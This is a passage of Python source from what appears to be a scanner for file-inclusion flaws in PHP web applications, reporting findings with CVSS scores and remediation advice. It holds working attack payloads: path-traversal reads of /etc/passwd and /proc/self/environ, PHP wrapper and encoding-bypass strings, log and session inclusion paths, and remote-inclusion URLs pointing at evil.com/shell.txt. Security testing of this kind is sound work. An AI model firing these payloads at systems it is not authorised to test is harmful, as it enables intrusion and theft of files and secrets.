                        response = await client.get(test_url)
                        result = ResponseAnalyzer.analyze(response, payload, baseline)
                        
                        if result.vulnerable:
                            if result.target_os:
                                self.detected_os = result.target_os
                            
                            self._add_finding(
                                name="Local File Inclusion (Path Traversal)",
                                description=f"Path traversal vulnerability in parameter '{param_name}'. {description}",
                                severity="HIGH" if not result.source_disclosed else "CRITICAL",
                                host=base_url,
                                endpoint=test_url,
                                result=result,
                                param=param_name,
                            )
                            break  # Found LFI, stop testing this file
                            
                    except Exception as e:
                        logger.debug(f"Path traversal test error: {e}")
    
    async def _test_php_wrappers(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test PHP stream wrappers."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        # Generate wrapper payloads
        wrapper_payloads = PayloadGenerator.generate_wrapper_payloads("/etc/passwd")
        wrapper_payloads.extend(PayloadGenerator.generate_wrapper_payloads("index.php"))
        wrapper_payloads.extend(PayloadGenerator.generate_wrapper_payloads("../config.php"))
        
        for url, param_name, parsed in vulnerable_params[:15]:
            baseline = self.baseline_responses.get(url, "")
            
            for payload, description, wrapper in wrapper_payloads[:20]:
                await rate_limiter.acquire()
                
                params = parse_qs(parsed.query)
                params[param_name] = [payload]
                query = urlencode(params, doseq=True)
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                if test_url in self.tested_payloads:
                    continue
                self.tested_payloads.add(test_url)
                
                try:
                    # Special handling for php://input
                    if wrapper == PHPWrapper.INPUT:
                        response = await client.post(
                            test_url,
                            content="<?php echo 'LFI_TEST'; ?>"
                        )
                    else:
                        response = await client.get(test_url)
                    
                    result = ResponseAnalyzer.analyze(response, payload, baseline)
                    
                    if result.vulnerable:
                        severity = "CRITICAL" if result.rce_possible else "HIGH"
                        
                        self._add_finding(
                            name=f"PHP Wrapper Exploitation ({description})",
                            description=f"PHP wrapper '{wrapper.value}' is exploitable via parameter '{param_name}'.",
                            severity=severity,
                            host=base_url,
                            endpoint=test_url,
                            result=result,
                            param=param_name,
                        )
                        break
                        
                except Exception as e:
                    logger.debug(f"PHP wrapper test error: {e}")
    
    async def _test_forms(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        forms: list[dict],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test forms for LFI vulnerabilities."""
        for form in forms[:30]:
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])
            
            # Find file-related inputs
            file_inputs = [
                inp for inp in inputs
                if any(s in inp.get("name", "").lower() for s in PayloadGenerator.LFI_PARAMS)
            ]
            
            if not file_inputs:
                continue
            
            form_url = urljoin(base_url, action) if action else base_url
            
            payloads = [
                ("../../../etc/passwd", "Basic traversal"),
                ("....//....//....//etc/passwd", "Filter bypass"),
                ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter"),
            ]
            
            for file_input in file_inputs[:3]:
                input_name = file_input.get("name", "")
                
                for payload, description in payloads:
                    await rate_limiter.acquire()
                    
                    form_data = {}
                    for inp in inputs:
                        name = inp.get("name", "")
                        if name:
                            if name == input_name:
                                form_data[name] = payload
                            else:
                                form_data[name] = inp.get("value", "test")
                    
                    try:
                        if method == "POST":
                            response = await client.post(form_url, data=form_data)
                        else:
                            response = await client.get(form_url, params=form_data)
                        
                        result = ResponseAnalyzer.analyze(response, payload)
                        
                        if result.vulnerable:
                            self._add_finding(
                                name="LFI in Form Parameter",
                                description=f"Form input '{input_name}' vulnerable to LFI. {description}",
                                severity="HIGH",
                                host=base_url,
                                endpoint=form_url,
                                result=result,
                                param=input_name,
                            )
                            break
                            
                    except Exception as e:
                        logger.debug(f"Form LFI test error: {e}")
    
    async def _test_rfi(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for Remote File Inclusion."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        # RFI payloads
        rfi_payloads = [
            ("http://evil.com/shell.txt", "HTTP RFI"),
            ("https://evil.com/shell.txt", "HTTPS RFI"),
            ("//evil.com/shell.txt", "Protocol-relative RFI"),
            ("\\\\evil.com\\shell.txt", "UNC path RFI"),
            ("ftp://evil.com/shell.txt", "FTP RFI"),
            ("http://127.0.0.1:8080/shell.txt", "SSRF via RFI"),
        ]
        
        for url, param_name, parsed in vulnerable_params[:10]:
            baseline = self.baseline_responses.get(url, "")
            
            for payload, description in rfi_payloads:
                await rate_limiter.acquire()
                
                params = parse_qs(parsed.query)
                params[param_name] = [payload]
                query = urlencode(params, doseq=True)
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                try:
                    response = await client.get(test_url)
                    content = response.text.lower()
                    
                    # RFI indicators
                    rfi_indicators = [
                        "allow_url_include",
                        "allow_url_fopen",
                        "failed to open stream: http",
                        "failed to open stream: https",
                        "couldn't open remote file",
                        "http request failed",
                        "wrapper is disabled",
                    ]
                    
                    found_indicators = [i for i in rfi_indicators if i in content]
                    
                    if found_indicators:
                        self._add_finding(
                            name=f"Remote File Inclusion ({description})",
                            description=f"Parameter '{param_name}' may be vulnerable to RFI. Server attempted to fetch remote content.",
                            severity="CRITICAL",
                            host=base_url,
                            endpoint=test_url,
                            result=LFIResult(
                                vulnerable=True,
                                lfi_type=LFIType.RFI,
                                confidence=70,
                                payload=payload,
                                evidence=[f"RFI indicator: {i}" for i in found_indicators],
                                rce_possible=True,
                            ),
                            param=param_name,
                        )
                        break
                        
                except Exception as e:
                    logger.debug(f"RFI test error: {e}")
    
    async def _test_log_poisoning(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for log poisoning vulnerabilities."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        if not vulnerable_params:
            return
        
        log_payloads = PayloadGenerator.generate_log_poisoning_paths()
        
        for url, param_name, parsed in vulnerable_params[:5]:
            baseline = self.baseline_responses.get(url, "")
            
            for payload, log_type in log_payloads[:15]:
                await rate_limiter.acquire()
                
                params = parse_qs(parsed.query)
                params[param_name] = [payload]
                query = urlencode(params, doseq=True)
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                try:
                    response = await client.get(test_url)
                    content = response.text
                    
                    # Log file indicators
                    log_indicators = [
                        "[error]",
                        "[notice]",
                        "[warn]",
                        "GET /",
                        "POST /",
                        "HTTP/1.",
                        "Mozilla/",
                        "Apache/",
                        "nginx/",
                        " 200 ",
                        " 404 ",
                        " 500 ",
                    ]
                    
                    found = [i for i in log_indicators if i in content and i not in baseline]
                    
                    if len(found) >= 2:
                        self._add_finding(
                            name=f"Log File Inclusion ({log_type})",
                            description=f"Log file accessible via parameter '{param_name}'. Potential for log poisoning RCE.",
                            severity="HIGH",
                            host=base_url,
                            endpoint=test_url,
                            result=LFIResult(
                                vulnerable=True,
                                lfi_type=LFIType.LOG_POISONING,
                                confidence=60,
                                payload=payload,
                                evidence=[f"Log indicator: {i}" for i in found[:3]],
                                rce_possible=True,
                            ),
                            param=param_name,
                        )
                        break
                        
                except Exception as e:
                    logger.debug(f"Log poisoning test error: {e}")
    
    async def _test_session_inclusion(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for session file inclusion."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        if not vulnerable_params:
            return
        
        # First, get a session
        await rate_limiter.acquire()
        try:
            response = await client.get(base_url)
            cookies = response.cookies
            
            # Look for PHP session ID
            session_id = None
            for cookie_name in ["PHPSESSID", "SESSID", "session"]:
                if cookie_name in cookies:
                    session_id = cookies[cookie_name]
                    break
            
            if not session_id:
                return
            
            # Generate session file paths
            session_paths = [
                path.format(session_id=session_id)
                for path in PayloadGenerator.SESSION_PATHS
            ]
            
            for url, param_name, parsed in vulnerable_params[:5]:
                for session_path in session_paths:
                    for depth in [5, 7, 10]:
                        traversal = "../" * depth
                        payload = f"{traversal}{session_path.lstrip('/')}"
                        
                        await rate_limiter.acquire()
                        
                        params = parse_qs(parsed.query)
                        params[param_name] = [payload]
                        query = urlencode(params, doseq=True)
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                        
                        try:
                            response = await client.get(test_url)
                            content = response.text
                            
                            # Session file indicators
                            if any(ind in content for ind in ["|s:", "|i:", "|a:", "|O:"]):
                                self._add_finding(
                                    name="Session File Inclusion",
                                    description=f"PHP session file accessible via parameter '{param_name}'. "
                                               f"Potential for session poisoning RCE.",
                                    severity="CRITICAL",
                                    host=base_url,
                                    endpoint=test_url,
                                    result=LFIResult(
                                        vulnerable=True,
                                        lfi_type=LFIType.SESSION_INCLUSION,
                                        confidence=70,
                                        payload=payload,
                                        evidence=[
                                            f"Session ID: {session_id}",
                                            "PHP serialized session data found",
                                        ],
                                        rce_possible=True,
                                    ),
                                    param=param_name,
                                )
                                return
                                
                        except Exception as e:
                            logger.debug(f"Session inclusion test error: {e}")
                            
        except Exception as e:
            logger.debug(f"Session test error: {e}")
    
    async def _test_proc_self(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test /proc/self exploitation."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        proc_targets = [
            ("/proc/self/environ", "Environment variables"),
            ("/proc/self/cmdline", "Command line"),
            ("/proc/self/status", "Process status"),
            ("/proc/self/fd/0", "File descriptor 0"),
            ("/proc/self/fd/1", "File descriptor 1"),
            ("/proc/self/fd/2", "File descriptor 2"),
            ("/proc/self/cwd", "Current directory"),
            ("/proc/self/exe", "Executable path"),
            ("/proc/version", "Kernel version"),
            ("/proc/net/tcp", "TCP connections"),
            ("/proc/net/udp", "UDP connections"),
        ]
        
        for url, param_name, parsed in vulnerable_params[:10]:
            baseline = self.baseline_responses.get(url, "")
            
            for proc_path, description in proc_targets:
                for depth in [5, 7, 10]:
                    traversal = "../" * depth
                    payload = f"{traversal}{proc_path.lstrip('/')}"
                    
                    await rate_limiter.acquire()
                    
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    query = urlencode(params, doseq=True)
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                    
                    try:
                        response = await client.get(test_url)
                        result = ResponseAnalyzer.analyze(response, payload, baseline)
                        
                        if result.vulnerable:
                            self._add_finding(
                                name=f"Proc Filesystem Access ({description})",
                                description=f"Access to {proc_path} via parameter '{param_name}'.",
                                severity="HIGH",
                                host=base_url,
                                endpoint=test_url,
                                result=result,
                                param=param_name,
                            )
                            break
                            
                    except Exception as e:
                        logger.debug(f"Proc test error: {e}")
    
    async def _test_encoding_bypass(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test various encoding techniques to bypass filters."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        # Base payload
        base_payload = "../../../etc/passwd"
        
        for url, param_name, parsed in vulnerable_params[:10]:
            baseline = self.baseline_responses.get(url, "")
            
            # Get all encoding variants
            encoded_payloads = PayloadEncoder.get_all_encodings(base_payload)
            
            for payload, encoding_type in encoded_payloads:
                await rate_limiter.acquire()
                
                params = parse_qs(parsed.query)
                params[param_name] = [payload]
                query = urlencode(params, doseq=True)
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                if test_url in self.tested_payloads:
                    continue
                self.tested_payloads.add(test_url)
                
                try:
                    response = await client.get(test_url)
                    result = ResponseAnalyzer.analyze(response, payload, baseline)
                    
                    if result.vulnerable:
                        self._add_finding(
                            name=f"LFI via {encoding_type} Encoding",
                            description=f"Filter bypass using {encoding_type} encoding on parameter '{param_name}'.",
                            severity="HIGH",
                            host=base_url,
                            endpoint=test_url,
                            result=result,
                            param=param_name,
                        )
                        break
                        
                except Exception as e:
                    logger.debug(f"Encoding bypass test error: {e}")
    
    def _add_finding(
        self,
        name: str,
        description: str,
        severity: str,
        host: str,
        endpoint: str,
        result: LFIResult,
        param: str,
    ) -> None:
        """Add a finding to the results."""
        cvss_scores = {
            "CRITICAL": 9.8,
            "HIGH": 7.5,
            "MEDIUM": 5.5,
            "LOW": 3.5,
        }
        
        evidence = result.evidence + [
            f"Payload: {result.payload}",
            f"Confidence: {result.confidence}%",
            f"LFI Type: {result.lfi_type.name}",
        ]
        
        if result.target_os:
            evidence.append(f"Target OS: {result.target_os.value}")
        if result.wrapper_used:
            evidence.append(f"Wrapper: {result.wrapper_used.value}")
        if result.rce_possible:
            evidence.append("⚠️ RCE POSSIBLE")
        if result.source_disclosed:
            evidence.append("📄 Source code disclosed")
        if result.file_content:
            evidence.append(f"Content preview: {result.file_content[:100]}...")
        
        finding = Finding(
            type="lfi" if result.lfi_type != LFIType.RFI else "rfi",
            name=name,
            severity=severity,
            description=description,
            host=host,
            matched_at=endpoint,
            evidence=evidence,
            cvss_score=cvss_scores.get(severity, 7.5),
            cwe="CWE-22" if result.lfi_type != LFIType.RFI else "CWE-98",
            remediation=self._get_remediation(result),
            references=[
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://cwe.mitre.org/data/definitions/22.html",
                "https://portswigger.net/web-security/file-path-traversal",
            ],
        )
        
        self.findings.append(finding.to_dict())
        
        logger.info(
            f"🚨 LFI Found [{severity}] - {name} | "
            f"Confidence: {result.confidence}% | Param: {param}"
        )
    
    def _get_remediation(self, result: LFIResult) -> str:
        """Get context-specific remediation advice."""
        base = (
            "1. Never use user input directly in file paths.\n"
            "2. Use allowlists for permitted files/directories.\n"
            "3. Use basename() to extract filename and validate.\n"
            "4. Implement proper input validation and sanitization.\n"
            "5. Use realpath() and verify the resolved path is within allowed directory.\n"
            "6. Configure open_basedir in PHP to restrict file access.\n"
        )
        
        if result.lfi_type == LFIType.RFI:
            base += (
                "\n\nRFI SPECIFIC:\n"
                "7. Disable allow_url_include in PHP.\n"
                "8. Disable allow_url_fopen if not needed.\n"
                "9. Use local file references only.\n"
            )
        
        if result.wrapper_used:
            base += (
                "\n\nPHP WRAPPER SPECIFIC:\n"
                "7. Disable dangerous wrappers in php.ini.\n"
                "8. Set allow_url_include=Off.\n"
                "9. Use stream_wrapper_unregister() for unused wrappers.\n"
            )
        
        if result.lfi_type == LFIType.LOG_POISONING:
            base += (
                "\n\nLOG POISONING SPECIFIC:\n"
                "7. Ensure log files are not accessible via web.\n"
                "8. Store logs outside web root.\n"
                "9. Sanitize user input in logs.\n"
            )
        
        return base


# Export version
__all__ = ["LFIScanner", "LFI_SCANNER_VERSION"]
